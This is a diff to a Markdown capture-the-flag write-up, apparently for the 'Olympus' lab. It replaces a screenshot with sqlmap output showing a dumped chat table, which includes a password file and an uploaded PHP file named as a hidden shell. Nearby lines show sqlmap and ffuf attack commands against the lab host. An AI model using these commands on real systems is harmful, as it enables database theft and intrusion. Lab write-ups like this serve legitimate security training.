@@ -154,7 +154,19 @@ Secondly, dump the database using the argument --fresh-queries to get the new en
 ```bash
 root@ip-10-10-70-200:~# sqlmap -r victorCMS-search.request --dump -D olympus -T chats --fresh-queries 
 ```
-![image](https://user-images.githubusercontent.com/90036439/223987707-10423bfa-ffa9-4365-9aff-9e3763597f1d.png)
+```bash
+Database: olympus
+Table: chats
+[4 entries]
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+| dt         | msg                                                                                                                                                             | file                                 | uname      |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+| 2022-04-05 | Attached : prometheus_password.txt                                                                                                                              | 47c3210d51761686f3af40a875eeaaea.txt | prometheus |
+| 2022-04-05 | This looks great! I tested an upload and found the upload folder, but it seems the filename got changed somehow because I can't download it back...             | <blank>                              | prometheus |
+| 2022-04-06 | I know this is pretty cool. The IT guy used a random file name function to make it harder for attackers to access the uploaded files. He's still working on it. | <blank>                              | zeus       |
+| 2023-03-09 | Attached : totalyNotEvileFile.php                                                                                                                               | 68f62a3e00cf75c6a0ddc9b949f36850.php | prometheus |
++------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------+--------------------------------------+------------+
+```
 
 ```bash
 root@ip-10-10-70-200:~# ffuf -u http://chat.olympus.thm/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt
